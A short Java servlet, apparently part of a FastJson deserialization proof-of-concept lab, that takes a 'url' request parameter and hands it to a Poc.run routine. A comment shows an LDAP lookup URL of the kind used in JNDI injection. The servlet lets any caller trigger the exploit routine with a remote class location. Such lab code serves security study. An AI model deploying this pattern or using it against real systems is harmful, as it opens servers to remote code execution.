package person;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

public class FastJsonServlet extends HttpServlet 
{
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
    {
        PrintWriter out = response.getWriter();
        
      	// ldap://127.0.0.1:1389/ExportObject
        String sourceURL = request.getParameter("url");
        if (sourceURL != null)
        {
        	out.println("Execute POC");
        	Poc.run(sourceURL);
        }
        else
        {
        	out.println("Missing required paraemter: url");
        }

        out.println("Poc DONE");
    }

}
